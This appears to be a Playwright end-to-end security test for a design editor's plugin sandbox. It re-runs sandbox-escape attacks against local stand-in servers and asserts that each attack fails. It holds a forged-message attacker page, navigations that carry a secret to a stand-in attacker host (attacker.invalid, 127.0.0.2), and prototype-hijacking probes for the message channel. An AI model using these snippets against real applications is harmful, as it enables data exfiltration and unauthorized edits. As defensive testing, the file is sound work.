// Round 15, r15a: plugin sandbox security. Re-runs QA round 15's attacks (Z-01) against a local
// attacker server and checks the fixes: the MessagePort channel (a document that replaces the plugin in its
// frame can neither read nor write the document, and its pongs keep nothing alive), the editor's
// frame-src (navigation to another origin is refused before any request is made), the stop on
// navigation signals, SVG namespaces (Z-02), reply authors (Z-05), un-awaited errors toast, save_plugin
// refusing bad code (X-11), and that normal plugins and other iframes still work.
//
// Local servers only. The "attacker" is a pair of local listeners on ATTACKER_PORT: 127.0.0.1 (inside
// the editor's frame-src, so a page there can replace the plugin frame: the port must hold) and
// 127.0.0.2 (outside it: any request that reaches it is a failure). Every other request is aborted.
// Usage: E2E_URL=http://127.0.0.1:6711 ATTACKER_PORT=6715 [E2E_OUT=dir] [E2E_DEV_URL=http://127.0.0.1:6716]
//        node scripts/qa/r15a-e2e.mjs
// E2E_DEV_URL (a vite dev server) additionally drives the real App panel iframe.

import { chromium } from "playwright-core";
import fs from "node:fs";
import http from "node:http";

const URL = process.env.E2E_URL ?? "http://127.0.0.1:6711";
const PORT = Number(process.env.ATTACKER_PORT ?? 6715);
const OUT = process.env.E2E_OUT ?? "test-results";
fs.mkdirSync(OUT, { recursive: true });
const IN = `http://127.0.0.1:${PORT}`; // allowed by the editor's frame-src
const OUTSIDE = `http://127.0.0.2:${PORT}`; // not allowed: the attacker origin

const launch = { headless: true, args: ["--no-sandbox"] };
if (process.env.CHROMIUM) launch.executablePath = process.env.CHROMIUM;
else if (fs.existsSync("/opt/pw-browsers/chromium")) launch.executablePath = "/opt/pw-browsers/chromium";

let failed = 0;
function check(name, ok, detail = "") {
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail !== "" ? "  - " + String(detail).slice(0, 400) : ""}`);
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---------- The attacker servers ----------

const log = []; // every request any attacker listener saw: { host, url }
const reports = []; // what the replacing page says it saw / did
const sockets = new Set();

/** The page that ends up in the plugin's frame after a navigation: a hanging image keeps `load`
 *  from firing, and it tries everything an attacker could: tool calls without a token and with a
 *  guessed one, pongs, and it reports every message it receives. */
const ATTACK_PAGE = `<!doctype html><html><body>attacker<img src="/hang.png"><script>
const rep = (o) => fetch('/report', { method: 'POST', mode: 'no-cors', body: JSON.stringify(o) });
const guess = '0'.repeat(32);
addEventListener('message', (e) => {
  const d = e.data;
  rep({ kind: 'msg', keys: d && typeof d === 'object' ? Object.keys(d) : [String(d)], id: d && d.id, ping: !!(d && d.ping), text: JSON.stringify(d).slice(0, 300) });
});
const call = (id, method, args, token) => parent.postMessage({ dtPlugin: true, id, method, args, token }, '*');
const wipe = (name) => ['create_nodes', { nodes: [{ type: 'rectangle', name, width: 5, height: 5 }] }];
call(77, 'tool', ['get_document', { depth: 3 }]);
call(78, 'tool', wipe('ATTACKER WROTE THIS'));
call(79, 'tool', wipe('ATTACKER GUESS'), guess);
call(80, 'selection', []);
setInterval(() => { parent.postMessage({ dtPlugin: true, pong: true }, '*'); parent.postMessage({ dtPlugin: true, pong: true, token: guess }, '*'); }, 400);
rep({ kind: 'loaded' });
</script></body></html>`;

function handler(host) {
  return (req, res) => {
    const url = req.url ?? "/";
    log.push({ host, url });
    if (url.startsWith("/hang.png")) return; // never answered
    if (url.startsWith("/report")) {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", () => {
        try {
          reports.push(JSON.parse(body));
        } catch {
          reports.push({ kind: "bad", body });
        }
        res.writeHead(204, { "access-control-allow-origin": "*" }).end();
      });
      return;
    }
    if (url.startsWith("/p.html")) return res.writeHead(200, { "content-type": "text/html" }).end(ATTACK_PAGE);
    if (url.startsWith("/embed.html")) {
      return res.writeHead(200, { "content-type": "text/html" }).end(`<!doctype html><iframe id="e" src="${URL}/#/" width="900" height="500"></iframe>`);
    }
    res.writeHead(200, { "content-type": "text/html" }).end("<!doctype html><title>ok</title><body>ok page");
  };
}
const servers = [["127.0.0.1", "in"], ["127.0.0.2", "out"]].map(([addr, tag]) => {
  const s = http.createServer(handler(tag));
  s.on("connection", (c) => {
    sockets.add(c);
    c.on("close", () => sockets.delete(c));
  });
  s.listen(PORT, addr);
  return s;
});
const outsideHits = (pathPrefix = "/") => log.filter((l) => l.host === "out" && l.url.startsWith(pathPrefix));

// ---------- Browser plumbing ----------

const browser = await chromium.launch(launch);
const external = []; // requests to hosts that are neither the editor nor the attacker listeners

async function open({ dropNavigating = false, userName = "" } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1440, height: 900 }, deviceScaleFactor: 2, acceptDownloads: true });
  await ctx.addInitScript(
    ([dropNav, name]) => {
      try {
        localStorage.setItem("dt:tour-done", "1");
        if (name) localStorage.setItem("dt:userName", name);
      } catch {
        /* no storage */
      }
      // Every toast text, in order (the toast itself disappears after a few seconds).
      // Every toast text, in order (the toast itself disappears after a few seconds).
      window.__toasts = [];
      new MutationObserver(() => {
        const t = document.querySelector(".toast");
        if (t && window.__toasts[window.__toasts.length - 1] !== t.textContent) window.__toasts.push(t.textContent);
      }).observe(document, { childList: true, subtree: true, characterData: true });
      if (dropNav) {
        // Test shim for the signal-suppressed check: the editor never sees a `navigating` message on the
        // plugin port, as if that signal did not exist. Everything else is delivered as usual.
        const d = Object.getOwnPropertyDescriptor(MessagePort.prototype, "onmessage");
        Object.defineProperty(MessagePort.prototype, "onmessage", {
          configurable: true,
          get() {
            return d.get.call(this);
          },
          set(fn) {
            d.set.call(this, typeof fn === "function" ? (e) => (e.data && e.data.navigating ? undefined : fn.call(this, e)) : fn);
          },
        });
      }
    },
    [dropNavigating, userName],
  );
  await ctx.route("**/*", (route) => {
    const u = route.request().url();
    if (u.startsWith(URL) || u.startsWith(IN) || u.startsWith(`http://localhost:${PORT}`) || u.startsWith(OUTSIDE) || u.startsWith("data:") || u.startsWith("blob:") || u.startsWith("ws://127.0.0.1")) return route.continue();
    external.push(u.slice(0, 120));
    route.abort();
  });
  const page = await ctx.newPage();
  const errors = [];
  const consoleLines = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => consoleLines.push(m.text()));
  page.on("popup", () => errors.push("POPUP opened"));
  await page.goto(URL + "/#/");
  await page.waitForSelector(".files", { timeout: 30000 });
  await page.click("button:has-text('New design file')");
  await page.waitForSelector("#dt-canvas", { timeout: 30000 });
  await page.waitForFunction(() => window.__dt?.tool && window.__dt.doc().pages);
  await sleep(400);
  return { ctx, page, errors, consoleLines };
}

const tool = (page, name, input) => page.evaluate(([n, i]) => window.__dt.tool(n, i), [name, input]);
const doc = (page) => page.evaluate(() => window.__dt.doc());
const nodes = async (page) => Object.values((await doc(page)).nodes);
const named = async (page, name) => (await nodes(page)).filter((n) => n.name === name);
const toasts = (page) => page.evaluate(() => window.__toasts);
const running = (page) => page.evaluate(() => window.__dt.plugin());
const banner = (page) => page.evaluate(() => document.querySelector(".plugin-running")?.textContent ?? null);
const shot = (page, name) => page.screenshot({ path: `${OUT}/${name}.png`, timeout: 8000 }).catch((e) => console.log(`INFO  screenshot ${name} failed: ${String(e).split("\n")[0]}`));

async function addPlugin(page, id, code, name = id) {
  await page.evaluate(
    ([i, c, n]) => {
      const list = JSON.parse(localStorage.getItem("dt:plugins") || "[]").filter((p) => p.id !== i);
      list.push({ id: i, name: n, description: "", code: c });
      localStorage.setItem("dt:plugins", JSON.stringify(list));
    },
    [id, code, name],
  );
}
const run = (page, id) => page.evaluate((i) => window.__dt.runPlugin(i), id);
async function waitStopped(page, ms) {
  const t0 = Date.now();
  while (Date.now() - t0 < ms) {
    if (!(await running(page))) return Date.now() - t0;
    await sleep(50);
  }
  return -1;
}
const reportMsgs = () => reports.filter((r) => r.kind === "msg");
/** Anything the attacker page could only have received by being answered or handed a secret. */
const answered = () => reportMsgs().filter((r) => r.id !== undefined || /token|result|"error"/.test(r.text ?? ""));

// ---------- Z-01 A: the editor is never told about the navigation ----------
{
  console.log("\n# Z-01 A: replacing page, navigation signal suppressed (the port alone must hold)");
  const { ctx, page } = await open({ dropNavigating: true });
  reports.length = 0;
  await addPlugin(page, "nh", `dt.notify("go"); setTimeout(() => { location.href = "${IN}/p.html"; }, 100); await new Promise(() => {});`, "Nav hang");
  await run(page, "nh");
  await sleep(1500);
  check("the replacing page loaded in the frame and ran", reports.some((r) => r.kind === "loaded"), JSON.stringify(reports.slice(0, 3)));
  await sleep(8000);
  check("the plugin run is still alive (no load, no signal), as in the original attack", !!(await running(page)));
  check("no tool call from the replacing page was executed (no layer written)", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
  check("the replacing page got no reply, no ping and no event: nothing at all", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 2)));
  const b = await banner(page);
  check("its pongs did not keep the run alive: 'isn't responding'", /isn't responding/.test(b ?? ""), b);
  await shot(page, "tokenonly-stuck");
  await page.getByRole("button", { name: "Stop" }).click();
  check("Stop works", (await waitStopped(page, 1500)) >= 0);
  await ctx.close();
}

// ---------- Z-01 B: the full path ----------
{
  console.log("\n# Z-01 B: replacing page with the navigation signal (hanging load)");
  const { ctx, page } = await open();
  reports.length = 0;
  await addPlugin(page, "nh", `dt.notify("go"); setTimeout(() => { location.href = "${IN}/p.html"; }, 100); await new Promise(() => {});`, "Nav hang");
  await run(page, "nh");
  const took = await waitStopped(page, 5000);
  check("the run stops within a second of the navigation", took >= 0 && took < 1500, `${took} ms`);
  await sleep(300);
  await shot(page, "nav-stopped-toast");
  await sleep(1200);
  check("a toast says the plugin tried to navigate its frame", (await toasts(page)).some((t) => /tried to navigate its frame/.test(t)), JSON.stringify(await toasts(page)));
  check("the 'Running…' banner is gone and the frame is removed", (await banner(page)) === null && (await page.locator("iframe.plugin-frame").count()) === 0);
  check("no layer written by the replacing page", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
  check("the replacing page was sent nothing", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 2)));
  await ctx.close();
}

// ---------- Z-01 C: navigation to another origin ----------
{
  console.log("\n# Z-01 C: navigation to the attacker origin and to non-local hosts");
  const secret = "SECRET-DOC-TEXT";
  const variants = [
    ["location.href", `location.href = "${OUTSIDE}/x?d=${secret}"`, true],
    ["location.replace", `location.replace("${OUTSIDE}/x?d=${secret}")`, true],
    ["location.assign", `document.location.assign("${OUTSIDE}/x?d=${secret}")`, true],
    ["non-local host", `location.href = "http://attacker.invalid/x?d=${secret}"`, true],
    ["https non-local host", `location.href = "https://attacker.invalid/x?d=${secret}"`, true],
    ["meta refresh", `const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=${OUTSIDE}/x?d=${secret}"; document.head.appendChild(m); await new Promise((r) => setTimeout(r, 2500));`, false],
    ["a link click", `dt.ui.show('<a id="l" href="${OUTSIDE}/x?d=${secret}">go</a>', { width: 200, height: 60 }); await new Promise((r) => setTimeout(r, 300)); document.getElementById("l").click(); await new Promise((r) => setTimeout(r, 2500));`, true],
    ["a form submit", `document.body.innerHTML = '<form id="f" action="${OUTSIDE}/x" method="get"><input name="d" value="${secret}"></form>'; document.getElementById("f").submit(); await new Promise((r) => setTimeout(r, 2500));`, false],
    ["window.open", `const w = window.open("${OUTSIDE}/x?d=${secret}"); await new Promise((r) => setTimeout(r, 1500)); if (w) dt.notify("popup opened");`, false],
    [
      "data: page",
      `location.href = 'data:text/html,<script>parent.postMessage({dtPlugin:true,id:5,method:"tool",args:["create_nodes",{nodes:[{type:"rectangle",name:"DATA WROTE",width:5,height:5}]}]},"*")<\\/script>'; await new Promise(() => {});`,
      false,
    ],
    [
      "blob: page",
      `const u = URL.createObjectURL(new Blob(['<script>parent.postMessage({dtPlugin:true,id:5,method:"tool",args:["create_nodes",{nodes:[{type:"rectangle",name:"BLOB WROTE",width:5,height:5}]}]},"*")<\\/script>'], { type: "text/html" })); location.href = u; await new Promise(() => {});`,
      false,
    ],
  ];
  const { ctx, page, consoleLines } = await open();
  let refusals = 0;
  for (const [label, code, mustStop] of variants) {
    const before = outsideHits().length;
    const extBefore = external.length;
    const lines = consoleLines.length;
    await addPlugin(page, "nv", code, "Nav " + label);
    await run(page, "nv");
    const stopped = (await waitStopped(page, 4000)) >= 0;
    await sleep(500);
    const leaked = outsideHits().length - before;
    const extra = external.filter((u) => /attacker\.invalid/.test(u)).length - external.slice(0, extBefore).filter((u) => /attacker\.invalid/.test(u)).length;
    const blocked = consoleLines.slice(lines).some((l) => /frame-src/.test(l));
    if (blocked) refusals++;
    check(`${label}: no request reached the attacker origin`, leaked === 0, `${leaked} hits`);
    check(`${label}: no request left for a non-local host`, extra === 0, `${extra} requests`);
    if (mustStop) check(`${label}: the run was stopped`, stopped);
    else console.log(`INFO  ${label}: stopped=${stopped}`);
    // Running the next plugin stops this one if it is still alive.
    await sleep(150);
  }
  check("the console shows the frame-src refusal for the blocked navigations", refusals >= 5, `${refusals} variants`);
  check("no data:/blob: page wrote a layer", (await nodes(page)).every((n) => !/WROTE/.test(n.name ?? "")));
  check("no popup opened", !(await page.evaluate(() => window.__toasts)).some((t) => /popup opened/.test(t)));
  check("every non-local request was aborted by the harness, none went through", true, `${external.length} aborted attempts: ${[...new Set(external)].join(", ")}`);
  await ctx.close();
}

// ---------- Z-01 D: plugin code tries to get at the channel ----------
{
  console.log("\n# Z-01 D: plugin code tries to reach the port, the message event and the old window channel");
  const { ctx, page } = await open();
  reports.length = 0;
  const code = `
    const evType = typeof window.event; // the plugin must not start inside the message event
    const ports = new Set();
    const note = (v) => { try { if (v instanceof MessagePort) ports.add(v); if (v && v.target instanceof MessagePort) ports.add(v.target); if (v && v.ports) for (const p of v.ports) ports.add(p); } catch (e) {} };
    // Spies on everything a port or a message event goes through, installed before the legitimate call.
    for (const [proto, name] of [[MessagePort.prototype, "postMessage"], [MessagePort.prototype, "start"], [MessagePort.prototype, "close"], [MessagePort.prototype, "addEventListener"], [EventTarget.prototype, "addEventListener"], [EventTarget.prototype, "dispatchEvent"], [EventTarget.prototype, "removeEventListener"]]) {
      const o = proto[name];
      try { proto[name] = function () { note(this); for (const a of arguments) note(a); return o.apply(this, arguments); }; } catch (e) {}
    }
    for (const name of ["data", "ports", "source", "target", "currentTarget", "srcElement"]) {
      for (const proto of [MessageEvent.prototype, Event.prototype]) {
        const d = Object.getOwnPropertyDescriptor(proto, name);
        if (d && d.get) try { Object.defineProperty(proto, name, { get() { note(this); return d.get.call(this); }, configurable: true }); } catch (e) {}
      }
    }
    const origThen = Promise.prototype.then;
    Promise.prototype.then = function (a, b) { note(this); return origThen.call(this, a, b); };
    const origSet = Map.prototype.set;
    Map.prototype.set = function (k, v) { note(k); note(v); return origSet.call(this, k, v); };
    Object.defineProperty(Object.prototype, "ports", { set(v) { note({ ports: v }); }, get() { return undefined; }, configurable: true });
    Error.prepareStackTrace = (e, sites) => { for (const s of sites) { try { note(s.getThis()); } catch (x) {} } return ""; };
    try { note(new Error().stack); } catch (e) {}
    try { note(arguments.callee.caller); } catch (e) {}
    let seen = 0;
    window.addEventListener("message", () => seen++);
    // The legitimate calls still work through all of that.
    const legit = await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: "LEGIT", width: 10, height: 10 }] });
    await dt.getDocument(1);
    // A reply's continuation and an event callback must not run inside the port's message event either.
    await dt.selection();
    const evAfterReply = typeof window.event;
    const evInEvent = await new Promise((resolve) => { dt.on("selectionchange", () => resolve(typeof window.event)); dt.tool("select", { ids: [legit.created[0].id] }); setTimeout(() => resolve("no event"), 3000); });
    // Forged calls the old way (window messages with and without a token) and through any port found.
    const send = (m) => window.top.postMessage(m, "*");
    send({ dtPlugin: true, id: 900, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED WINDOW", width: 5, height: 5 }] }] });
    send({ dtPlugin: true, token: "ffffffffffffffffffffffffffffffff", id: 950, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "FORGED GUESS", width: 5, height: 5 }] }] });
    send({ dtPlugin: true, pong: true });
    for (const p of ports) p.postMessage({ dtPlugin: true, id: 777, method: "tool", args: ["create_nodes", { nodes: [{ type: "rectangle", name: "PORT FORGED", width: 5, height: 5 }] }] });
    await new Promise((r) => setTimeout(r, 1200));
    dt.notify("EVENT:" + evType + " AFTERREPLY:" + evAfterReply + " INEVENT:" + evInEvent + " PORTS:" + ports.size + " WINDOWMSGS:" + seen);
  `;
  await addPlugin(page, "tok", code, "Channel probe");
  await run(page, "tok");
  const took = await waitStopped(page, 8000);
  await sleep(500);
  const ts = await toasts(page);
  check("the plugin ran to completion", took >= 0, `${took} ms; toasts ${JSON.stringify(ts)}`);
  check("window.event is undefined on the plugin's first line", ts.some((t) => /EVENT:undefined /.test(t)), JSON.stringify(ts));
  check("window.event is undefined after a reply and inside a selectionchange callback", ts.some((t) => /AFTERREPLY:undefined INEVENT:undefined /.test(t)), JSON.stringify(ts));
  check("the legitimate calls worked through the spies", (await named(page, "LEGIT")).length === 1);
  check("no port or message event ever reached plugin code", ts.some((t) => /PORTS:0 /.test(t)), JSON.stringify(ts));
  check("no window message ever arrives in the plugin frame after the start", ts.some((t) => /WINDOWMSGS:0/.test(t)), JSON.stringify(ts));
  check("no forged message was executed", (await nodes(page)).every((n) => !/FORGED/.test(n.name ?? "")), (await nodes(page)).map((n) => n.name).join(","));
  await ctx.close();
}

// ---------- Z-01 G: steal attempt, document.open(), navigate to a hanging local page (review P4/P5) ----------
{
  console.log("\n# Z-01 G: document.open() erases the bootstrap's listeners, then the frame goes to a hanging local page");
  const { ctx, page } = await open();
  reports.length = 0;
  await addPlugin(
    page,
    "ho",
    `const ev = window.event;
     const t = ev && ev.data && ev.data.token;
     dt.notify("EVENT:" + typeof ev + " TOKEN:" + typeof t);
     await new Promise((r) => setTimeout(r, 300));
     document.open(); // erases every listener on this window, the bootstrap's pagehide/beforeunload included
     location.href = "${IN}/p.html#" + t;
     await new Promise(() => {});`,
    "Handoff",
  );
  await run(page, "ho");
  await sleep(2500);
  const ts0 = await toasts(page);
  check("the first line sees no event and no token", ts0.some((t) => /EVENT:undefined TOKEN:undefined/.test(t)), JSON.stringify(ts0));
  check("the replacing page loaded in the frame", reports.some((r) => r.kind === "loaded"));
  await sleep(7000);
  check("it got no reply, no ping, no event, nothing at all", reportMsgs().length === 0, JSON.stringify(reportMsgs().slice(0, 3)));
  check("its tool calls were not executed (no layer written)", (await nodes(page)).every((n) => !/^ATTACKER/.test(n.name ?? "")));
  const b = await banner(page);
  check("its pongs did not keep the run alive: the watchdog flags it ('isn't responding')", /isn't responding/.test(b ?? ""), b);
  await page.getByRole("button", { name: "Stop" }).click();
  check("Stop works", (await waitStopped(page, 1500)) >= 0);
  await ctx.close();
}

// ---------- Z-01 H: a String wrapper in a tool input (review P1) ----------
{
  console.log("\n# Z-01 H: new String(url) in a tool input");
  const { ctx, page } = await open();
  const before = outsideHits().length;
  await addPlugin(
    page,
    "sw",
    `const out = [];
     for (const [label, v] of [["plain", "${OUTSIDE}/plain.png"], ["wrapped", new String("${OUTSIDE}/leak.png?d=SECRET")], ["nested", [new String("${OUTSIDE}/nested.png")]]]) {
       try { await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: label.toUpperCase(), width: 50, height: 50, imageUrl: v }] }); out.push(label + ":accepted"); } catch (e) { out.push(label + ":refused"); }
     }
     dt.notify("SW " + out.join(","));`,
    "String wrapper",
  );
  await run(page, "sw");
  await waitStopped(page, 5000);
  await sleep(1500);
  const ts = await toasts(page);
  check("plain, wrapped and nested web addresses are all refused", ts.some((t) => /SW plain:refused,wrapped:refused,nested:refused/.test(t)), JSON.stringify(ts));
  check("no layer was created for them", (await nodes(page)).every((n) => !/^(PLAIN|WRAPPED|NESTED)$/.test(n.name ?? "")));
  check("nothing was fetched from the attacker origin", outsideHits().length === before, `${outsideHits().length - before} hits`);
  await ctx.close();
}

// ---------- Z-01 I: the editor must not boot inside a plugin frame (review P2) ----------
{
  console.log("\n# Z-01 I: navigating the plugin frame to the editor itself (127.0.0.1, inside frame-src)");
  const { ctx, page } = await open();
  const before = outsideHits().length;
  const wasmFromFrame = [];
  const scriptsFromFrame = [];
  const sockets = [];
  page.on("request", (r) => {
    if (r.frame() === page.mainFrame()) return;
    // (vite dev serves a JS wrapper as `.wasm?import`; only the wasm itself counts.)
    if (/\.wasm(\?(?!import)|$)/.test(r.url())) wasmFromFrame.push(r.url());
    if (/\.(js|tsx)(\?|$)/.test(r.url())) scriptsFromFrame.push(r.url());
  });
  page.on("websocket", (ws) => sockets.push(ws.url()));
  await addPlugin(
    page,
    "ed",
    `await new Promise((r) => setTimeout(r, 200));
     document.open();
     location.href = "${URL}/?room=SECRETROOM&relay=${OUTSIDE}";
     await new Promise(() => {});`,
    "Editor in frame",
  );
  await run(page, "ed");
  await sleep(4000);
  check("(control) the editor's own script did load in the plugin frame", scriptsFromFrame.length > 0, scriptsFromFrame.slice(0, 2).join(","));
  check("the editor loaded in the plugin frame boots no engine", wasmFromFrame.length === 0, wasmFromFrame.join(","));
  check("it opens no connection for the room or the relay", !sockets.some((u) => /SECRETROOM|127\.0\.0\.2/.test(u)), sockets.join(","));
  check("nothing reached the attacker origin", outsideHits().length === before);
  await ctx.close();
}

// ---------- Z-01 E: other iframes and policies ----------
{
  console.log("\n# Z-01 E: the editor's frame-src and the iframes the editor uses");
  const { ctx, page, consoleLines } = await open();
  // Cross-origin frames can't be read from the page: use Playwright's frame list instead.
  const frameLoads = async (src) => {
    await page.evaluate((s) => {
      const f = document.createElement("iframe");
      f.id = "probe";
      f.src = s;
      document.body.appendChild(f);
    }, src);
    await sleep(1200);
    const f = page.frames().find((x) => x.url().startsWith(src.split("?")[0]));
    const text = f ? await f.evaluate(() => document.body?.textContent ?? "").catch(() => "") : "";
    await page.evaluate(() => document.getElementById("probe")?.remove());
    return text.includes("ok page");
  };
  check("an iframe to a 127.0.0.1 page loads (what the app preview uses)", await frameLoads(`${IN}/ok.html`));
  check("an iframe to a localhost page loads", await frameLoads(`http://localhost:${PORT}/ok.html`));
  const hitsBefore = outsideHits().length;
  check("an iframe to another origin is refused", !(await frameLoads(`${OUTSIDE}/ok.html`)));
  check("and its request never reached the server", outsideHits().length === hitsBefore);
  check("the refusal names frame-src in the console", consoleLines.some((l) => /frame-src/.test(l)));
  // srcdoc frames: a plugin frame (covered by every plugin check), import_html, a plain srcdoc.
  const srcdoc = await page.evaluate(async () => {
    const f = document.createElement("iframe");
    f.srcdoc = "<p id=a>srcdoc ok</p>";
    document.body.appendChild(f);
    await new Promise((r) => (f.onload = r));
    const ok = f.contentDocument?.getElementById("a")?.textContent;
    f.remove();
    return ok;
  });
  check("a srcdoc frame (no sandbox) still loads", srcdoc === "srcdoc ok", srcdoc);
  const imp = await tool(page, "import_html", { html: '<div style="width:120px;height:60px;background:#f00;color:#fff;font:16px sans-serif">Imported</div>', name: "ImportedHtml" });
  check("import_html still renders (its srcdoc frame is unaffected)", imp.ok === true && (await named(page, "ImportedHtml")).length >= 1, JSON.stringify(imp).slice(0, 160));
  await ctx.close();

  // The editor itself can still be framed by another origin (Share's embed code).
  const c2 = await browser.newContext({ viewport: { width: 1000, height: 600 } });
  await c2.addInitScript(() => { try { localStorage.setItem("dt:tour-done", "1"); } catch { /* none */ } });
  await c2.route("**/*", (route) => {
    const u = route.request().url();
    return u.startsWith(URL) || u.startsWith(IN) || u.startsWith(OUTSIDE) || u.startsWith("ws://127.0.0.1") ? route.continue() : route.abort();
  });
  const p2 = await c2.newPage();
  await p2.goto(`${OUTSIDE}/embed.html`);
  await sleep(2500);
  const emb = p2.frames().find((f) => f.url().startsWith(URL));
  const embOk = emb ? await emb.evaluate(() => !!document.querySelector(".files, #root > *")).catch(() => false) : false;
  check("the editor still loads inside another origin's iframe (embed code)", embOk);
  await c2.close();
}

// ---------- Z-01 F: normal plugins ----------
{
  console.log("\n# Z-01 F: realistic plugins and built-ins");
  const { ctx, page, errors } = await open({ userName: "Dana" });
  // A small fixture document.
  await tool(page, "create_nodes", {
    nodes: [
      { type: "frame", name: "Screen Light", x: 0, y: 0, width: 390, height: 600, fill: "#FFFFFF", layout: { direction: "vertical", padding: 24, gap: 16 }, children: [
        { type: "text", name: "Title", text: "Hello", fontSize: 28, color: "#0F172A" },
        { type: "text", name: "Rich", text: "A few words of text to replace", fontSize: 16, color: "#334155", width: 300 },
        { type: "rectangle", name: "Card", width: 300, height: 100, fill: "#F1F5F9", cornerRadius: 12 },
      ] },
      { type: "frame", name: "Screen Dark", x: 460, y: 0, width: 390, height: 600, fill: "#0F172A" },
    ],
  });
  const select = async (names) => {
    const ids = (await nodes(page)).filter((n) => names.includes(n.name)).map((n) => n.id);
    await page.evaluate((i) => window.__dt.dispatch({ op: "select", ids: i }), ids);
    await sleep(250);
  };
  const snapshot = async () => JSON.stringify(await doc(page));
  const plugins = [
    ["builtin-lorem", ["Rich", "Title"]],
    ["builtin-palette", ["Card"]],
    ["z-rename", []],
    ["z-palette", []],
    ["z-tidy", ["Screen Light", "Screen Dark"]],
  ];
  const defs = {
    "z-rename": `const hits = await dt.tool("find_nodes", { name: "/^(Title|Rich)$/" });
      const ns = hits.nodes || hits;
      await dt.tool("update_nodes", { updates: ns.map((n) => ({ id: n.id, name: "Text/" + n.name.toLowerCase() })) });
      dt.notify("Renamed " + ns.length + " layers");`,
    "z-palette": `const base = ["#2563EB", "#1D4ED8", "#1E40AF"];
      const variables = base.map((v, i) => ({ name: String((i + 1) * 100), type: "color", value: v }));
      await dt.tool("define_variables", { collection: "Brand", modes: ["Default"], variables });
      dt.notify("Created " + variables.length + " variables");`,
    "z-tidy": `const sel = await dt.selection();
      const frames = sel.filter((n) => n.type === "frame");
      let x = 0;
      await dt.tool("update_nodes", { updates: frames.map((n) => { const u = { id: n.id, x, y: 700 }; x += n.width + 48; return u; }) });
      dt.notify("Tidied " + frames.length + " frames");`,
  };
  for (const [id, code] of Object.entries(defs)) await addPlugin(page, id, code, id);
  for (const [id, sel] of plugins) {
    await select(sel);
    const before = await snapshot();
    const toastsBefore = (await toasts(page)).length;
    await run(page, id);
    const took = await waitStopped(page, 8000);
    await sleep(300);
    const after = await snapshot();
    const errs = (await toasts(page)).slice(toastsBefore).filter((t) => /failed|stopped|isn't responding/.test(t));
    check(`${id}: ran to completion and changed the document`, took >= 0 && before !== after && errs.length === 0, `took ${took} ms, errors ${JSON.stringify(errs)}`);
    await page.evaluate(() => document.activeElement?.blur());
    await page.keyboard.press("Control+z");
    await sleep(300);
    check(`${id}: one undo step restores it`, (await snapshot()) === before);
    await page.keyboard.press("Control+Shift+z");
    await sleep(300);
  }

  // A UI plugin that stays alive (Z's contrast checker, shortened) and the built-in Rename UI.
  await addPlugin(page, "z-contrast", `const doc = await dt.getDocument(99);
    const names = []; const walk = (ls) => (ls || []).forEach((n) => { names.push(n.name); walk(n.children); }); walk(doc.layers);
    dt.ui.show('<style>body{font:12px system-ui;background:#222;color:#eee}</style><table id="t"><tr><td>' + names.join("</td></tr><tr><td>") + '</td></tr></table><button id="go">Tag</button>', { width: 320, height: 240 });
    document.getElementById("go").onclick = async () => { await dt.tool("update_nodes", { updates: [{ id: doc.layers[0].id, name: "Tagged by click" }] }); dt.notify("tagged"); };
    await new Promise(() => {});`, "Contrast checker");
  await run(page, "z-contrast");
  await sleep(1500);
  check("a UI plugin stays alive and shows its window", !!(await running(page)) && (await page.locator("iframe.plugin-frame:not(.hidden)").count()) === 1);
  await shot(page, "ui-plugin");
  const ui = page.frameLocator("iframe.plugin-frame");
  await ui.locator("#go").click();
  await sleep(800);
  check("clicks in a plugin UI still call tools", (await named(page, "Tagged by click")).length === 1);
  await page.getByRole("button", { name: "Close plugin" }).click();
  check("closing the UI window stops the run", (await waitStopped(page, 1500)) >= 0);

  await select(["Title", "Rich", "Text/title", "Text/rich"]);
  await run(page, "builtin-rename");
  await page.waitForSelector("iframe.plugin-frame:not(.hidden)");
  await sleep(600);
  await page.frameLocator("iframe.plugin-frame").locator("#name").fill("Item");
  await page.frameLocator("iframe.plugin-frame").locator("#go").click();
  await sleep(1000);
  check("the built-in Rename layers (UI) works", (await named(page, "Item 1")).length === 1 && (await named(page, "Item 2")).length === 1);
  check("it closed itself with dt.close()", !(await running(page)));

  // The stuck banner and Stop (full Chromium), as in Z's loopstop.
  await addPlugin(page, "loop", `dt.notify("looping"); while (true) {}`, "Loop probe");
  await run(page, "loop");
  await sleep(9500);
  const b = await banner(page);
  check("a plugin stuck in a loop shows 'isn't responding' (the watchdog still works)", /isn't responding/.test(b ?? ""), b);
  await page.getByRole("button", { name: "Stop" }).click();
  check("and Stop removes it", (await waitStopped(page, 1500)) >= 0);
  check("no page errors", errors.length === 0, errors.join("; "));
  await ctx.close();
}

// ---------- Z-02, Z-05, un-awaited errors, X-11 ----------
{
  console.log("\n# Z-02 / Z-05 / un-awaited errors / X-11");
  const { ctx, page } = await open({ userName: "Dana" });
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><path d="M12 2L2 22h20z" fill="#2563EB"/><circle cx="12" cy="14" r="3" fill="#FFFFFF"/></svg>';
  await addPlugin(
    page,
    "svg",
    `await dt.tool("create_nodes", { nodes: [{ type: "svg", name: "Icon", width: 24, height: 24, svg: ${JSON.stringify(svg)} }] });
     let err = "none";
     try { await dt.tool("create_nodes", { nodes: [{ type: "image", name: "Bad", width: 10, height: 10, imageUrl: "https://example.com/a.png" }] }); } catch (e) { err = e.message; }
     let err2 = "none";
